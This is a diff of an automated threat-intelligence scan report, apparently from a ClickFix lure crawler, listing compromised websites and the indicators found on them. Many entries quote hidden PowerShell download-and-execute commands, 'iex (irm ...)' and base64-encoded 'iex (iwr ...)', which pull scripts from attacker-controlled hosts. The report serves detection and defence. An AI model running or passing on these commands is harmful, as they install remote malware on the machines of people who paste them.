@@ -1,10 +1,10 @@
 {
-  "ReportTime": "2025-04-18 15:38:39",
-  "TotalSites": 38,
+  "ReportTime": "2025-04-18 16:38:23",
+  "TotalSites": 40,
   "Sites": [
     {
       "Url": "https://riverview-pools.com/verify/index.html",
-      "Timestamp": "2025-04-18 15:38:19",
+      "Timestamp": "2025-04-18 16:37:57",
       "Base64Strings": null,
       "Urls": [
         "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
@@ -35,7 +35,7 @@
           "FullMatch": "'https://aatox.com/verify/45.ps1'",
           "URL": "https://aatox.com/verify/45.ps1",
           "Context": "...nst htaPath = \"-NoP -WindowStyle Hidden -Command \\\"iex (irm 'https://aatox.com/verify/45.ps1')\\\"\"; const commandToRun = \"powershell \" + htaP...",
-          "DownloadedFile": "D:\\a\\ClickGrab\\ClickGrab\\ClickFix_Output_20250418_153819\\Downloads\\riverview-pools.com_20250418_153819_45.ps1"
+          "DownloadedFile": "D:\\a\\ClickGrab\\ClickGrab\\ClickFix_Output_20250418_163757\\Downloads\\riverview-pools.com_20250418_163757_45.ps1"
         },
         {
           "FullMatch": "const htaPath = \"-NoP -WindowStyle Hidden -Command \\\"",
@@ -53,7 +53,7 @@
     },
     {
       "Url": "https://blessdayservices.org/up/",
-      "Timestamp": "2025-04-18 15:38:21",
+      "Timestamp": "2025-04-18 16:37:59",
       "Base64Strings": null,
       "Urls": [
         "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
@@ -104,7 +104,7 @@
     },
     {
       "Url": "https://jessespridecharters.com/v/",
-      "Timestamp": "2025-04-18 15:38:23",
+      "Timestamp": "2025-04-18 16:38:01",
       "Base64Strings": null,
       "Urls": [
         "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
@@ -158,7 +158,7 @@
     },
     {
       "Url": "https://mail.lucprofessional.com.br/",
-      "Timestamp": "2025-04-18 15:38:25",
+      "Timestamp": "2025-04-18 16:38:02",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -189,7 +189,7 @@
     },
     {
       "Url": "https://mail.finocci.com/",
-      "Timestamp": "2025-04-18 15:38:25",
+      "Timestamp": "2025-04-18 16:38:03",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -201,7 +201,7 @@
     },
     {
       "Url": "https://kevinzhangadmin.jintsume.net/",
-      "Timestamp": "2025-04-18 15:38:26",
+      "Timestamp": "2025-04-18 16:38:03",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -232,7 +232,7 @@
     },
     {
       "Url": "https://cambodiatouristservice.com/",
-      "Timestamp": "2025-04-18 15:38:27",
+      "Timestamp": "2025-04-18 16:38:04",
       "Base64Strings": null,
       "Urls": [
         "https://browser.certif-update.website/",
@@ -247,7 +247,7 @@
     },
     {
       "Url": "https://admin.gestroom.it/",
-      "Timestamp": "2025-04-18 15:38:27",
+      "Timestamp": "2025-04-18 16:38:05",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -259,7 +259,7 @@
     },
     {
       "Url": "https://test.peperoncinochepassione.it/",
-      "Timestamp": "2025-04-18 15:38:28",
+      "Timestamp": "2025-04-18 16:38:06",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=",
         "Decoded": "iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content"
@@ -290,7 +290,7 @@
     },
     {
       "Url": "https://first-security-verden.de/",
-      "Timestamp": "2025-04-18 15:38:28",
+      "Timestamp": "2025-04-18 16:38:07",
       "Base64Strings": null,
       "Urls": [
         "https://www.webgo.de/assets/images/misc/hazard-50x50.png",
@@ -308,7 +308,7 @@
     },
     {
       "Url": "https://lucprofessional.com.br/",
-      "Timestamp": "2025-04-18 15:38:28",
+      "Timestamp": "2025-04-18 16:38:07",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -339,7 +339,7 @@
     },
     {
       "Url": "https://www.first-security-verden.de/",
-      "Timestamp": "2025-04-18 15:38:29",
+      "Timestamp": "2025-04-18 16:38:08",
       "Base64Strings": null,
       "Urls": [
         "https://www.webgo.de/assets/images/misc/hazard-50x50.png",
@@ -357,7 +357,7 @@
     },
     {
       "Url": "https://zamilgroups.com/",
-      "Timestamp": "2025-04-18 15:38:29",
+      "Timestamp": "2025-04-18 16:38:08",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -369,7 +369,7 @@
     },
     {
       "Url": "https://www.laborpartyjo.com/",
-      "Timestamp": "2025-04-18 15:38:30",
+      "Timestamp": "2025-04-18 16:38:09",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -400,7 +400,7 @@
     },
     {
       "Url": "https://finocci.com/",
-      "Timestamp": "2025-04-18 15:38:30",
+      "Timestamp": "2025-04-18 16:38:09",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -412,7 +412,7 @@
     },
     {
       "Url": "https://www.amun.jintsume.net/",
-      "Timestamp": "2025-04-18 15:38:30",
+      "Timestamp": "2025-04-18 16:38:10",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -443,7 +443,7 @@
     },
     {
       "Url": "https://www.finocci.com/",
-      "Timestamp": "2025-04-18 15:38:30",
+      "Timestamp": "2025-04-18 16:38:10",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -455,7 +455,7 @@
     },
     {
       "Url": "https://www.website.mypetapp.co.za/",
-      "Timestamp": "2025-04-18 15:38:31",
+      "Timestamp": "2025-04-18 16:38:11",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -486,7 +486,7 @@
     },
     {
       "Url": "https://www.lucprofessional.grupomoltz.com.br/",
-      "Timestamp": "2025-04-18 15:38:31",
+      "Timestamp": "2025-04-18 16:38:12",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -517,7 +517,7 @@
     },
     {
       "Url": "https://thesignaturemag.salviatech.com/",
-      "Timestamp": "2025-04-18 15:38:32",
+      "Timestamp": "2025-04-18 16:38:12",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -548,7 +548,7 @@
     },
     {
       "Url": "https://www.bratusferramentas.grupomoltz.com.br/",
-      "Timestamp": "2025-04-18 15:38:32",
+      "Timestamp": "2025-04-18 16:38:13",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -579,7 +579,7 @@
     },
     {
       "Url": "https://website.mypetapp.co.za/",
-      "Timestamp": "2025-04-18 15:38:33",
+      "Timestamp": "2025-04-18 16:38:14",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -610,7 +610,7 @@
     },
     {
       "Url": "https://ningbocrm.jintsume.net/",
-      "Timestamp": "2025-04-18 15:38:33",
+      "Timestamp": "2025-04-18 16:38:14",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -641,7 +641,7 @@
     },
     {
       "Url": "https://horno-rafelet.es/",
-      "Timestamp": "2025-04-18 15:38:34",
+      "Timestamp": "2025-04-18 16:38:15",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -672,7 +672,7 @@
     },
     {
       "Url": "https://mail.ningbocrm.com/",
-      "Timestamp": "2025-04-18 15:38:34",
+      "Timestamp": "2025-04-18 16:38:15",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -703,7 +703,7 @@
     },
     {
       "Url": "https://mail.laborpartyjo.com/",
-      "Timestamp": "2025-04-18 15:38:34",
+      "Timestamp": "2025-04-18 16:38:16",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -734,7 +734,7 @@
     },
     {
       "Url": "https://www.kevinzhangadmin.jintsume.net/",
-      "Timestamp": "2025-04-18 15:38:34",
+      "Timestamp": "2025-04-18 16:38:16",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -765,7 +765,7 @@
     },
     {
       "Url": "https://bmdcompany.com/",
-      "Timestamp": "2025-04-18 15:38:34",
+      "Timestamp": "2025-04-18 16:38:17",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -777,7 +777,7 @@
     },
     {
       "Url": "https://www.zamilgroups.com/",
-      "Timestamp": "2025-04-18 15:38:35",
+      "Timestamp": "2025-04-18 16:38:17",
       "Base64Strings": null,
       "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
       "PowerShellCommands": null,
@@ -789,7 +789,7 @@
     },
     {
       "Url": "https://lucprofessional.grupomoltz.com.br/",
-      "Timestamp": "2025-04-18 15:38:35",
+      "Timestamp": "2025-04-18 16:38:17",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -820,7 +820,7 @@
     },
     {
       "Url": "https://laborpartyjo.com/",
-      "Timestamp": "2025-04-18 15:38:36",
+      "Timestamp": "2025-04-18 16:38:18",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -851,7 +851,7 @@
     },
     {
       "Url": "https://www.thesignaturemag.salviatech.com/",
-      "Timestamp": "2025-04-18 15:38:36",
+      "Timestamp": "2025-04-18 16:38:18",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -882,7 +882,7 @@
     },
     {
       "Url": "https://www.test.peperoncinochepassione.it/",
-      "Timestamp": "2025-04-18 15:38:36",
+      "Timestamp": "2025-04-18 16:38:19",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=",
         "Decoded": "iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content"
@@ -912,8 +912,23 @@
       }
     },
     {
+      "Url": "https://mail.cambodiatouristservice.com/",
+      "Timestamp": "2025-04-18 16:38:20",
+      "Base64Strings": null,
+      "Urls": [
+        "https://browser.certif-update.website/",
+        "https://browser.certif-update.website/"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
       "Url": "https://www.ningbocrm.jintsume.net/",
-      "Timestamp": "2025-04-18 15:38:37",
+      "Timestamp": "2025-04-18 16:38:20",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -944,7 +959,7 @@
     },
     {
       "Url": "https://my.salviatech.com/",
-      "Timestamp": "2025-04-18 15:38:37",
+      "Timestamp": "2025-04-18 16:38:21",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=",
         "Decoded": "iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content"
@@ -975,7 +990,7 @@
     },
     {
       "Url": "http://82.146.62.232/",
-      "Timestamp": "2025-04-18 15:38:38",
+      "Timestamp": "2025-04-18 16:38:22",
       "Base64Strings": {
         "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
         "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
@@ -1006,7 +1021,7 @@
     },
     {
       "Url": "http://101.32.40.22/",
-      "Timestamp": "2025-04-18 15:38:38",
+      "Timestamp": "2025-04-18 16:38:22",
       "Base64Strings": null,
       "Urls": [
         "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
@@ -1030,8 +1045,20 @@
       "PowerShellDownloads": null
     },
     {
+      "Url": "http://twitch.tj/",
+      "Timestamp": "2025-04-18 16:38:22",
+      "Base64Strings": null,
+      "Urls": null,
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
       "Url": "https://staplebrokenmetaliyro.blogspot.com/",
-      "Timestamp": "2025-04-18 15:38:38",
+      "Timestamp": "2025-04-18 16:38:22",
       "Base64Strings": null,
       "Urls": [
         "http://www.w3.org/1999/xhtml",
@@ -1064,7 +1091,7 @@
         "https://www.blogger.com/profile/02686294779557843862",
         "https://www.blogger.com/go/report-abuse",
         "https://resources.blogblog.com/blogblog/data/res/2796432393-indie_compiled.js",
-        "https://www.blogger.com/static/v1/widgets/3339277135-widgets.js",
+        "https://www.blogger.com/static/v1/widgets/2218197725-widgets.js",
         "https://staplebrokenmetaliyro.blogspot.com/",
         "https://staplebrokenmetaliyro.blogspot.com/",
         "https://staplebrokenmetaliyro.blogspot.com/",
@@ -1078,7 +1105,7 @@
         "https://www.blogger.com/profile/02686294779557843862\\x22",
         "https://apis.google.com/js/platform.js",
         "https://staplebrokenmetaliyro.blogspot.com/",
-        "https://www.blogger.com/static/v1/jsbin/3394855029-lbx.js",
+        "https://www.blogger.com/static/v1/jsbin/709570948-lbx.js",
         "https://www.blogger.com/static/v1/v-css/3681588378-lightbox_bundle.css"
       ],
       "PowerShellCommands": null,
